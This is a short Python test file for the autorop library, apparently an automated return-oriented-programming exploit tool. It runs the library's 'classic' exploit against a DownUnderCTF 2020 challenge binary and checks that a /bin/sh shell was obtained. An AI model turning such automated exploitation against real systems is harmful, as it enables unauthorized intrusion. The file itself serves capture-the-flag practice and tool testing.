from autorop import *


def test_return_to_what():
    BIN = "./tests/ductf_2020/return-to-what"
    s = PwnState(BIN, process(BIN))
    turnkey.classic(s)
    s.target.clean(1)
    s.target.sendline("echo $0")
    assert s.target.readline() == b"/bin/sh\n"


if __name__ == "__main__":
    test_return_to_what()
